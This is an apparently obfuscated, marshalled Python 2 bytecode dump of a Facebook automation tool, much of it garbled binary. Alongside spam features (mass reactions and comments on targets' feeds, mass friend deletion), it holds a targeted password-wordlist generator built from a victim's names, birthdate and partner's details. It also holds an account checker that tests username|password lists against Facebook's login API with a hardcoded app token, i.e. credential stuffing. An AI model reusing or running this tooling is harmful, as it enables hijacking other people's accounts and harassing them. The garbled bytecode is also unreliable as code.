 GHd GHd GHd GHd GHt	   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s*   [1;97mâ--[1;91m> [1;92m1. [1;97mLikes*   [1;97mâ--[1;91m> [1;92m2. [1;97mLoves)   [1;97mâ--[1;91m> [1;92m3. [1;97mWows*   [1;97mâ--[1;91m> [1;92m4. [1;97mHahas,   [1;97mâ--[1;91m> [1;92m5. [1;97mSadBoys+   [1;97mâ--[1;91m> [1;92m6. [1;97mAngrys*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R   R(   RF   Rn   RI   R   R   R+   R)   t   react_pilih(   Rb   (    (    s   <Ahmad_Riswanto>R  e  s&    c          C   sõ   t  d  }  |  d k r' d GHt   nÊ |  d k rC d a t   n® |  d k r_ d a t   n |  d k r{ d	 a t   nv |  d
 k r d a t   nZ |  d k r³ d a t   n> |  d k rÏ d a t   n" |  d k rå t   n d GHt   d  S(   Ns   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] Wrong inputR%   t   LIKER&   t   LOVERp   t   WOWRq   t   HAHARr   t   SADRs   t   ANGRYR'   (   R*   R  t   tipet   reactRy   (   t   aksi(    (    s   <Ahmad_Riswanto>R  z  s4    







c          C   s¥  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } t	 d  } yí t
 j d	 | d
 | d |   } t j | j  } t d  d d GHxo | d d D]_ } | d } t j |  t
 j d	 | d t d |   d | d  j d d  d t GHqä Wd d GHd t t t   GHt	 d  t   Wn' t k
 r d GHt	 d  t   n Xd  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s2   [1;91m[+] [1;92mInput ID Target [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   https://graph.facebook.com/s   ?fields=feed.limit(s   )&access_token=s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mât   feedRf   Rc   s   /reactions?type=s   &access_token=s   [1;92m[[1;97mi
   s   
t    s   ... [1;92m] [1;97ms   [1;91m[+][1;92m Done [1;97ms   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] ID not found(   R   R(   RF   Rn   RI   R   R   R+   R)   R*   RY   RZ   R[   R\   R]   R    t   reaksiR   R_   R"  R   R   R   Ry   RH   (   Rb   t   idet   limitt   oht   ahRg   Rk   (    (    s   <Ahmad_Riswanto>R#    s<    #
	
!%	

c          C   s¥   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHt	   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s*   [1;97mâ--[1;91m> [1;92m1. [1;97mLikes*   [1;97mâ--[1;91m> [1;92m2. [1;97mLoves)   [1;97mâ--[1;91m> [1;92m3. [1;97mWows*   [1;97mâ--[1;91m> [1;92m4. [1;97mHahas,   [1;97mâ--[1;91m> [1;92m5. [1;97mSadBoys+   [1;97mâ--[1;91m> [1;92m6. [1;97mAngrys*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R   R(   RF   Rn   RI   R   R   R+   R)   t   reactg_pilih(   Rb   (    (    s   <Ahmad_Riswanto>R  ¹  s&    c          C   sõ   t  d  }  |  d k r' d GHt   nÊ |  d k rC d a t   n® |  d k r_ d a t   n |  d k r{ d	 a t   nv |  d
 k r d a t   nZ |  d k r³ d a t   n> |  d k rÏ d a t   n" |  d k rå t   n d GHt   d  S(   Ns   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] Wrong inputR%   R  R&   R  Rp   R  Rq   R  Rr   R   Rs   R!  R'   (   R*   R,  R"  t   reactgRy   (   R$  (    (    s   <Ahmad_Riswanto>R,  Î  s4    







c    	      C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } t	 d  } y> t
 j d	 | d
 |   } t j | j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xyí t
 j d | d | d |   } t j | j  } t d  d d GHxo | d d D]_ } | d } t j |  t
 j d | d t d
 |   d | d  j d d  d t GHqLWd d GHd t t t   GHt	 d  t   Wn' t k
 rd  GHt	 d  t   n Xd  S(!   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s1   [1;91m[+] [1;92mInput ID Group [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rj   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s    https://graph.facebook.com/v3.0/s   ?fields=feed.limit(s   )&access_token=s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâR%  Rf   Rc   s   https://graph.facebook.com/s   /reactions?type=s   [1;92m[[1;97mi
   s   
R&  s   ... [1;92m] [1;97ms   [1;91m[+][1;92m Done [1;97ms   [1;91m[!] ID not found(   R   R(   RF   Rn   RI   R   R   R+   R)   R*   RY   RZ   R[   R\   R]   RH   R  R    t
   reaksigrupR   R_   R"  R   R   R   Ry   (	   Rb   R(  R)  R/   R   R*  R+  Rg   Rk   (    (    s   <Ahmad_Riswanto>R-  ì  sL    
#
	
!%	

c          C   sÄ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHt	 d  } t	 d	  } t	 d
  } | j
 d d  } yé t j d | d | d |   } t j | j  } t d  d d GHxk | d d D][ } | d } t j |  t j d | d | d |   d | d  j
 d d  d GHqWd d GHd t t t   GHt	 d  t   Wn' t k
 r¿d GHt	 d  t   n Xd  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s6   [1;91m[!] [1;92mUse [1;97m'<>' [1;92mfor new liness,   [1;91m[+] [1;92mID Target [1;91m:[1;97m s*   [1;91m[+] [1;92mComment [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   <>s   
s   https://graph.facebook.com/s   ?fields=feed.limit(s   )&access_token=s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâR%  Rf   Rc   s   /comments?message=s   &access_token=s   [1;92m[[1;97mi
   R&  s   ... [1;92m]s   [1;91m[+][1;92m Done [1;97ms   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] ID not found(   R   R(   RF   Rn   RI   R   R   R+   R)   R*   R   RY   RZ   R[   R\   R]   R    t   komenR   R_   R   R   Ry   RH   (   Rb   R(  t   kmR)  Ró   Rg   R¡   t   f(    (    s   <Ahmad_Riswanto>R    sB    #
	
!!	

c    
      C   s,  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHt	 d  } t	 d	  } t	 d
  } | j
 d d  } y> t j d | d |   } t j | j  } d | d GHWn' t k
 rd GHt	 d  t   n Xyé t j d | d | d |   } t j | j  } t d  d d GHxk | d d D][ } | d }	 t j |	  t j d |	 d | d |   d | d  j
 d d   d! GHqoWd d GHd" t t t   GHt	 d  t   Wn' t k
 r'd# GHt	 d  t   n Xd  S($   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s6   [1;91m[!] [1;92mUse [1;97m'<>' [1;92mfor new liness,   [1;91m[+] [1;92mID Group  [1;91m:[1;97m s*   [1;91m[+] [1;92mComment [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   <>s   
s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rj   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s    https://graph.facebook.com/v3.0/s   ?fields=feed.limit(s   )&access_token=s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâR%  Rf   Rc   s   https://graph.facebook.com/s   /comments?message=s   [1;92m[[1;97mi
   R&  s   ... [1;92m]s   [1;91m[+][1;92m Done [1;97ms   [1;91m[!] Error(   R   R(   RF   Rn   RI   R   R   R+   R)   R*   R   RY   RZ   R[   R\   R]   RH   Ry   R    t	   komengrupR   R_   R   R   (
   Rb   R(  R0  R)  R/   R   Ró   Rg   R¡   R1  (    (    s   <Ahmad_Riswanto>R  9  sR    
#
	
!!	

c          C   sõ  t  j d  yH t d d  j   }  t j d |   } t j | j  } | d } Wn7 t	 k
 r d GHt  j d  t
 j d  t   n Xt  j d  t GHd	 | GHt d
  d d GHt j d |   } t j | j  } xí | d D]á } | d } d } t j d | d |   }	 t j |	 j  }
 y3 |
 d d } d | d  j d d  d d GHWqí t k
 r¡d | d  j d d  d d GH| d 7} qí t j j k
 rÍd GHt d  t   qí Xqí Wd d GHd GHt d  t   d  S(    NR$   s	   login.txtR/   s+   https://graph.facebook.com/me?access_token=Rj   s   [1;91m[!] Token not founds   rm -rf login.txti   s)   [1;91m[+] [1;92mFrom [1;91m: [1;97m%ss"   [1;91m[+] [1;92mStart[1;97m ...i*   s
   [1;97mâs0   https://graph.facebook.com/me/feed?access_token=Rf   Rc   i    s   https://graph.facebook.com/s   ?method=delete&access_token=t   errort   messages   [1;91m[[1;97mi
   s   
R&  s   ...s   [1;91m] [1;95mFaileds   [1;92m[[1;97ms   [1;92m] [1;96mDeleteds   [1;91m[!] Connection Errors   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[+] [1;92mDone(   R   R(   RF   Rn   RY   RZ   R[   R\   R]   RI   R   R   R+   R)   R    R   t	   TypeErrorRa   R   R*   Ry   (   Rb   t   namt   lolRm   t   asut   asusRó   Rc   t   piroRe   t   okR3  (    (    s   <Ahmad_Riswanto>R  e  sJ    	
	
%!
	
c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } t
 j d | d	 |   } t j | j  } d
 t | d  k rÚ d GHt	 d  t   n  t d  d d GHx~ | d D]r } t
 j d | d d d |   } t j | j  } d t |  k rYd | d d GHqø d | d d GHqø Wd d GHd GHt	 d  t   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s3   https://graph.facebook.com/me/friendrequests?limit=s   &access_token=s   []Rf   s   [1;91m[!] No friend requests   
[1;91m[ [1;97mBack [1;91m]s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâs&   https://graph.facebook.com/me/friends/t   fromRc   s   ?access_token=R3  s    [1;97m[ [1;91mFailed[1;97m ] Rj   s    [1;97m[ [1;92mAccept[1;97m ] s   [1;91m[+] [1;92mDone(   R   R(   RF   Rn   RI   R   R   R+   R)   R*   RY   RZ   R[   R\   R]   R   Ry   R    R_   (   Rb   R)  R/   R	  R   t   gasRg   (    (    s   <Ahmad_Riswanto>R    s:    


	#	
c          C   sR  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  d GHd	 d
 GHyt t
 j d |   } t j | j  } xH | d D]< } | d } | d } t
 j d | d |   d | GHq½ WWn7 t k
 rn' t k
 r7d GHt d  t   n Xd GHt d  t   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s$   [1;91m[âº] [1;92mStart [1;97m...s   [1;97mStop [1;91mCTRL+Ci*   s
   [1;97mâs3   https://graph.facebook.com/me/friends?access_token=Rf   Rj   Rc   s*   https://graph.facebook.com/me/friends?uid=s   &access_token=s!   [1;97m[[1;92m Deleted [1;97m] s   [1;91m[!] Stoppeds   
[1;91m[ [1;97mBack [1;91m]s   
[1;91m[+] [1;92mDone(   R   R(   RF   Rn   RI   R   R   R+   R)   R    RY   RZ   R[   R\   R]   t   deletet
   IndexErrorR   R*   Ry   (   Rb   R  R   R   Rm   Rc   (    (    s   <Ahmad_Riswanto>R  ®  s<    
	

 

c          C   s    t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHt	   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s1   [1;97mâ--[1;91m> [1;92m1.[1;97m Create Posts5   [1;97mâ--[1;91m> [1;92m2.[1;97m Create Wordlists5   [1;97mâ--[1;91m> [1;92m3.[1;97m Account Checkers7   [1;97mâ--[1;91m> [1;92m4.[1;97m See my group lists3   [1;97mâ--[1;91m> [1;92m5.[1;97m Profile Guards*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R   R(   RF   Rn   RI   R   R   R+   R)   t
   pilih_lain(   Rb   (    (    s   <Ahmad_Riswanto>Rz   Ð  s$    c          C   s»   t  d  }  |  d k r' d GHt   n |  d k r= t   nz |  d k rS t   nd |  d k ri t   nN |  d k r t   n8 |  d k r t   n" |  d	 k r« t   n d GHt   d  S(
   Ns   [1;97mââ[1;91mD [1;97mR
   s   [1;91m[!] Wrong inputR%   R&   Rp   Rq   Rr   R'   (   R*   R@  t   statusRý   t
   check_akunt   grupsayat   guardRG   (   t   other(    (    s   <Ahmad_Riswanto>R@  ä  s$    






c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } | d k r£ d	 GHt	 d
  t
   n^ t j d | d |   } t j | j  } t d  d d GHd | d GHt	 d
  t
   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s.   [1;91m[+] [1;92mType status [1;91m:[1;97m R
   s   [1;91m[!] Don't be emptys   
[1;91m[ [1;97mBack [1;91m]s7   https://graph.facebook.com/me/feed?method=POST&message=s   &access_token=s%   [1;91m[âº] [1;92mCreate [1;97m...i*   s
   [1;97mâs,   [1;91m[+] [1;92mStatus ID[1;91m : [1;97mRc   (   R   R(   RF   Rn   RI   R   R   R+   R)   R*   Rz   RY   RZ   R[   R\   R]   R    (   Rb   t   msgt   resR   (    (    s   <Ahmad_Riswanto>RA  ú  s,    


	
c       Ð   C   s4  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy¤t  j d  t GHd GHd d	 GHt	 d
  } t | d d  } t	 d  } t	 d  } t	 d  } t	 d  } | d d !} | d d !} | d }	 d d	 GHd GHt	 d  }
 t	 d  } t	 d  } t
 d  | d d !} | d d !} | d } | j d | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | | |	 | | | |	 | | | | | |	 | | |	 | |	 | |	 |	 |	 | | | | |	 | | | | | |	 | | | | | |	 | | | | | |	 | |
 | | | | |
 | |
 | |
 | | |
 | | | | | |
 | | | | | | | | | | | | | | | | | | | | | | | | | | |
 | |
 | |
 | | | | | | | | | fÎ  d } x5 | d k  r| d } | j | t |  d  qÚWd } x5 | d k  rL| d } | j |
 t |  d  qWd } x5 | d k  r| d } | j | t |  d  qVWd } x5 | d k  rÈ| d } | j | t |  d  qW| j   t j d  d d	 GHd | GHt	 d  t   Wn) t k
 r/} d GHt	 d  t   n Xd  S(    NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s?   [1;91m[?] [1;92mFill in the complete data of the target belowi*   s
   [1;97mâs&   [1;91m[+] [1;92mNama Depan [1;97m: s   .txtR   s'   [1;91m[+] [1;92mNama Tengah [1;97m: s)   [1;91m[+] [1;92mNama Belakang [1;97m: s*   [1;91m[+] [1;92mNama Panggilan [1;97m: s>   [1;91m[+] [1;92mTanggal Lahir >[1;96mex: |DDMMYY| [1;97m: i    i   i   s)   [1;91m[?] [1;93mKalo Jomblo SKIP aja :vs&   [1;91m[+] [1;92mNama Pacar [1;97m: s0   [1;91m[+] [1;92mNama Panggilan Pacar [1;97m: sD   [1;91m[+] [1;92mTanggal Lahir Pacar >[1;96mex: |DDMMYY| [1;97m: s%   [1;91m[âº] [1;92mCreate [1;97m...sü  %s%s
%s%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s%s
%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%sid   s   
g      ø?s/   [1;91m[+] [1;92mSaved [1;91m: [1;97m %s.txts   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Failed(   R   R(   RF   Rn   RI   R   R   R+   R)   R*   R    R   R   R^   Rz   (   Rb   Rg   RË   Rá   Râ   R   R   R1  t   gt   hR   R   t   kt   lt   mR§   t   wgt   ent   wordt   gen(    (    s   <Ahmad_Riswanto>Rý   	  sx    	
	

ÿ ÿ }




		

c          C   s@  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd d	 GHg  } g  } g  } y% t	 d
  } t | d  j
   } Wn' t k
 rà d GHt	 d  t   n Xt	 d  } t d  d d	 GHxâ | D]Ú } | j   j t |   \ } }	 d | d |	 d }
 t j |
  } t j | j  } d | k r| j |	  d | d |	 GHqd | d k rÃ| j |	  d | d |	 GHq| j |	  d | d |	 GHqWd d	 GHd t t |   d t t |   d t t |   GHt	 d  t   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   sB   [1;91m[?] [1;92mCreate in file[1;91m : [1;97musername|passwordi*   s
   [1;97mâs,   [1;91m[+] [1;92mFile path [1;91m:[1;97m s   [1;91m[!] File not founds   
[1;91m[ [1;97mBack [1;91m]s,   [1;91m[+] [1;92mSeparator [1;91m:[1;97m s$   [1;91m[âº] [1;92mStart [1;97m...s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RC   s%   [1;97m[ [1;92mLive[1;97m ] [1;97mRÓ   s   www.facebook.comR´   s&   [1;97m[ [1;93mCheck[1;97m ] [1;97ms$   [1;97m[ [1;91mDie[1;97m ] [1;97ms4   [1;91m[+] [1;92mTotal[1;91m : [1;97mLive=[1;92ms    [1;97mCheck=[1;93ms    [1;97mDie=[1;91m(   R   R(   RF   Rn   RI   R   R   R+   R)   R*   Rô   Rz   R    R×   RÔ   R   RY   RZ   R[   R\   R]   R   R   (   Rb   t   liveRà   t   dieRË   t   listt   pemisaht   mekiRÝ   R5   Re   Rf   RÞ   (    (    s   <Ahmad_Riswanto>RB  Q	  sT    	

	!	=
c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xt  j d  t
 GHyÔ t j d |   } t j | j  } xp | d	 D]d } | d
 } | d } t d d  } t j |  | j | d  d t |  d t |  GHqÊ Wd d GHd t t  GHd GH| j   t d  t   Wn¨ t t f k
 rd GHt d  t   n| t k
 rÍt  j d  d GHt d  t   nI t j j k
 rïd GHt   n' t k
 rd GHt d  t   n Xd  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   Ru   s2   https://graph.facebook.com/me/groups?access_token=Rf   Rj   Rc   s   out/Grupid.txtR   s   
s!   [1;97m[ [1;92mMyGroup[1;97m ] s    => i*   s
   [1;97mâs0   [1;91m[+] [1;92mTotal Group [1;91m:[1;97m %ss6   [1;91m[+] [1;92mSaved [1;91m: [1;97mout/Grupid.txts   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Stoppeds   [1;91m[!] Group not founds   [1;91m[â] No Connections   [1;91m[!] Error(   R   R(   RF   Rn   RI   R   R   R+   R   R   R)   RY   RZ   R[   R\   R]   t   listgrupR   R   R   R   R^   R*   Rz   R   R   RH   R{   Ra   R   R   (   Rb   t   uht   gudRó   Rm   Rc   R1  (    (    s   <Ahmad_Riswanto>RC  	  s\    

!	







c          C   s  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHt
 d  }  |  d k r´ d } t t |  nU |  d k rÖ d } t t |  n3 |  d k rì t   n |  d k rt   n t   d  S(   NR$   s	   login.txtR/   s   [1;91m[!] Token not founds   rm -rf login.txti   s.   [1;97mâ--[1;91m> [1;92m1.[1;97m Activates2   [1;97mâ--[1;91m> [1;92m2.[1;97m Not activates*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   âs   [1;97mââ[1;91mD [1;97mR%   t   trueR&   t   falseR'   R
   (   R   R(   RF   Rn   Rb   RI   R   R   R+   R)   R*   RÃ   Rz   R   (   RH  t   aktift   non(    (    s   <Ahmad_Riswanto>RD  °	  s4    

c         C   s3   d |  } t  j |  } t j | j  } | d S(   Ns-   https://graph.facebook.com/me?access_token=%sRc   (   RY   RZ   R[   R\   R]   (   Rb   Re   RG  t   uid(    (    s   <Ahmad_Riswanto>t
   get_useridÎ	  s    
c         C   sç   t  |   } d | t |  f } i d d 6d |  d 6} d } t j | d | d | } | j GHd	 | j k r t j d
  t GHd GHt d  t	   nF d | j k r× t j d
  t GHd GHt d  t	   n d GHt
   d  S(   Ns  variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutations!   application/x-www-form-urlencodeds   Content-Types   OAuth %st   Authorizations"   https://graph.facebook.com/graphqlRf   t   headerss   "is_shielded":trueR$   s*   [1;91m[[1;96mâ[1;91m] [1;92mActivates   
[1;91m[ [1;97mBack [1;91m]s   "is_shielded":falses.   [1;91m[[1;96mâ[1;91m] [1;91mNot activates   [1;91m[!] Error(   R^  R   RY   R_   R]   R   R(   R)   R*   Rz   R   (   Rb   t   enableRc   Rf   R`  Re   RG  (    (    s   <Ahmad_Riswanto>RÃ   Ô	  s(    



t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(u   R   R   R   t   datetimeR   RU   R    RÍ   R[   RJ   Rº   t	   cookielibt   multiprocessing.poolR    RL   t   ImportErrorR(   RY   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRK   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R    R)   R#   RØ   RÑ   RÙ   RÚ   Rå   RÛ   R   R   R   R¢   R£   Rc   R¤   R¥   R¦   R¨   R`   R'  R.  R/  R2  RV  t   vulnott   vulnR.   R+   R,   RG   Ro   Rw   Rx   R   R   R   R   R   R   R1   R   R   R   Rª   R©   R«   R¬   RÏ   R­   R®   Rã   R¯   Rõ   R°   Rÿ   R   R  R  R  Ry   R  R  R  R#  R  R,  R-  R  R  R  R  R  Rz   R@  RA  Rý   RB  RC  RD  R^  RN   RÃ   t   __name__(    (    (    s   <Ahmad_Riswanto>t   <module>   sÐ   
			
				<		)	$	7		"	2	;	:	@	@	7	A	9	A			³		&			Ë	6				=	F	F	?					!			)	$	,	(	!	"				=	.	1		(   t   marshalt   loads(    (    (    s   com/com-2.pyt   <module>   s   